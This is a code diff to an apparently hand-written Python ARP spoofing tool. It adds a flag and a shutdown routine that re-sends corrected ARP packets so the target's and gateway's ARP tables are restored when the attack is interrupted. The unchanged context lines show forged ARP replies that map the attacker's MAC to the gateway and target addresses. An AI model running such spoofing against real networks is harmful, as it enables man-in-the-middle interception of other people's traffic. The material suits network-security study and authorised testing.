@@ -23,6 +23,7 @@ class ARPPacket(object):
         self.attacker_mac = self.__mac_to_hex(attacker_mac)
         self.gateway_mac = self.__mac_to_hex(gateway_mac)
         self.target_mac = self.__mac_to_hex(target_mac)
+        self.restore_arp_table: bool = False
 
     def __iter__(self):
         yield from (self.arp_pkt_to_gateway, self.arp_pkt_to_target)
@@ -60,14 +61,18 @@ class ARPPacket(object):
 
     @property
     def arp_pkt_to_gateway(self):
+        destination = self.target_mac if self.restore_arp_table is True \
+            else self.attacker_mac
         return b''.join((self.eth_header_to_gateway, self.arp_header,
-                         self.attacker_mac, self.target_ip,
+                         destination, self.target_ip,
                          self.gateway_mac, self.gateway_ip))
 
     @property
     def arp_pkt_to_target(self):
+        destination = self.gateway_mac if self.restore_arp_table is True \
+            else self.attacker_mac
         return b''.join((self.eth_header_to_target, self.arp_header,
-                         self.attacker_mac, self.gateway_ip,
+                         destination, self.gateway_ip,
                          self.target_mac, self.target_ip))
 
 
@@ -102,7 +107,12 @@ def spoof(args):
     try:
         spoofer.execute()
     except KeyboardInterrupt:
-        raise SystemExit('[!] Aborting ARP Spoofing attack...')
+        print('[!] Aborting ARP Spoofing attack...')
+        print('    [+] Restoring target ARP tables to their previous states...')
+        packets.restore_arp_table = True
+        spoofer.arp_packets = packets
+        spoofer.execute(max_packets=20, interval=1)
+        raise SystemExit('    [+] ARP Spoofing attack terminated.')
 
 
 if __name__ == '__main__':
